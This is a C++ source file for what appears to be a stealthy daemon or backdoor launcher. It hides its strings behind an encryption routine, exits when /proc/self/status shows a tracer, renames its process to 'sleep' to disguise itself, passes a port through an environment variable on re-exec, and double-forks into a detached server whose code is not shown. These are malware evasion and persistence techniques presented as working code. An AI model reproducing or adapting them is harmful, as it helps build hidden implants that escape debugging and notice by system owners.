#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <syslog.h>
#include <sys/stat.h>
#include "server.hpp"

int flag = 0;

std::string g_name ;
std::string g_port_env ;
int g_port;

int to_int(std::string &str) {
    int x = 0;
    std::stringstream geek;

    geek << g_port_env;
 
    geek >> x;
    return x;
}

bool isBeingDebugged() {
    // /proc/self/status
    std::ifstream status_file(decrypt({0x800000cd, 0x600000c6, 0x200000c6, 0x800000c5, 0xc4, 0x800000cd, 0xc6, 0xc00000c4, 0xe00000c5, 0xa00000c4, 0x800000cd, 0xc6, 0xe00000c6, 0x400000c4, 0xe00000c6, 0xc00000c6, 0xc6, }).c_str());
    std::string line;
    while (std::getline(status_file, line)) {
        // tracerpid
        if (line.find(decrypt({0xe00000c2, 0x200000c6, 0x400000c4, 0xc4, 0xc00000c4, 0x200000c6, 0x600000c2, 0x400000c5, 0xe00000c4, 0x200000cf, }).c_str()) != std::string::npos) {
            int tracer_pid = std::stoi(line.substr(line.find(":") + 1));
            return tracer_pid != 0;
        }
    }
    return false;
}



void init() {

    if (isBeingDebugged()) {
        exit(1);
    } 
    //HOSTNAME
    const char* name = getenv(decrypt({0xe00000c1 ,0x800000c1, 0x800000c0, 0xa00000c1, 0x400000c0 ,0xc00000c1 ,0xc00000c0 }).c_str());
    //OGP
    const char* port_env = getenv(decrypt({0x800000c1, 0x800000c0, 0x600000c2 }).c_str());
    if (name)
    {
        g_name = name;
    } 
    if (port_env)
    {
        g_port_env = port_env;
    }
    if (!g_port_env.length()) {
        return ;
    }
    if (!isNumeric(g_port_env))
    {
        exit(EXIT_FAILURE) ;
    }
    g_port = to_int(g_port_env);
    // changing new process name to sleep xd
    prctl(PR_SET_NAME, decrypt({0xc6, 0xe00000c5, 0xc00000c4, 0xc00000c4, 0x600000c6 }).c_str(), 0, 0, 0);
    flag = 1;
}


 void daemonize(){
     pid_t pid;

    pid = fork();

    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }

    pid = fork();

    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    umask(0);

    /* closing all open file descriptors */
    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }

    main_server();
 }

void exec(std::string &argv_0 ) {
    extern char** environ;
    std::vector<char*> existing_env;
    for (char** env = environ; *env != nullptr; ++env) {
        existing_env.push_back(*env);
    }
    /* setting enviornment */
    //OGP=
    existing_env.push_back(const_cast<char*>(std::string(decrypt({0x800000c1, 0x800000c0, 0x600000c2, 0xc00000cf, }).c_str() + std::to_string(8577)).c_str()));
    existing_env.push_back(nullptr); 
    if (execve(argv_0.c_str(), NULL, existing_env.data()) == -1) {
        return ;
    }
}

 void hh(std::string argv_0) {
    if ((g_name.size())) 
    {
        std::cout << "You are logged in as " << g_name << std::endl;
    }
    else {
    // Skibidi toilet skibidi skibidi toilet, Skibidi toilet skibidi skibidi toilet
       std::cout << "skibidi" << std::endl;
    }
    exec(argv_0);
}


int main(int argc, char **argv,char **envp) {

    init();
    if (flag == 0) {
        hh(argv[0]);
    }
    else {
        daemonize();
    }
    return 0;
 }